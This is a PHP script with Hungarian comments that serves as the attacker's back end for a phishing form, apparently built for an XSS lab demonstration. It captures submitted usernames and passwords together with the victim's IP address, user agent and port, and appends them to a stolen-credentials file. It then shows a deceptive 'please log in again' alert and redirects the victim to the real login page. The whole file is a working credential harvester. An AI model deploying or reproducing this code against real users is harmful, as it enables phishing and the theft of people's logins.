<?php 
session_start();

//Bejelentkezési adatok lopása
    //A kód struktúrájának forrása: https://hackingandsecurity.blogspot.com/2017/09/nice-to-havephp-cookie-stealer.html
	if (isset($_POST["login"])) {
            $username = $_POST['username'];
            $password = $_POST['password'];
			
			$file = "/home/attacker99/xss_attacker_result/stolen_credentials.txt";
            		$credentials = fopen("stolen_credentials.txt", "a+");
			$rem_port = $_SERVER['REMOTE_PORT'];
			$user_agent = $_SERVER['HTTP_USER_AGENT'];
			$date=date ("l dS of F Y h:i:s A");
			
			//Az IP azonosítására alkalmas kód forrása: https://www.w3resource.com/php-exercises/php-basic-exercise-5.php
			//Ha az IP interneten megosztott
			if (!empty($_SERVER['HTTP_CLIENT_IP']))   
			  {
				$ip_address = $_SERVER['HTTP_CLIENT_IP'];
			  }
				//Ha az IP a proxy-n van
				elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
				  {
					$ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
				  }
					//Ha az IP remote címen található
					else
					  {
						$ip_address = $_SERVER['REMOTE_ADDR'];
					  }
			
			if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) {
				fputs($credentials, "IP: $ip_address | USERNAME: $username | PASSWORD: $password | DATE: $date |USER AGENT: $user_agent | PORT: $rem_port <br>");
			} else {
				fputs($credentials, "IP: $ip_address | USERNAME: $username | PASSWORD: $password | DATE: $date |USER AGENT: $user_agent | PORT: $rem_port \n\n");
				fclose($credentials);
				
				echo "<script>alert('Sikeres adategyeztetés! Kérem, jelentkezzen be újra!')</script>";
				header ("Location: http://192.168.***.***:8080/xss_user/vedekezes_elott/login.php");
			}

    } else {
        header("Location:malicious_form.php");
        exit;
    }
?>
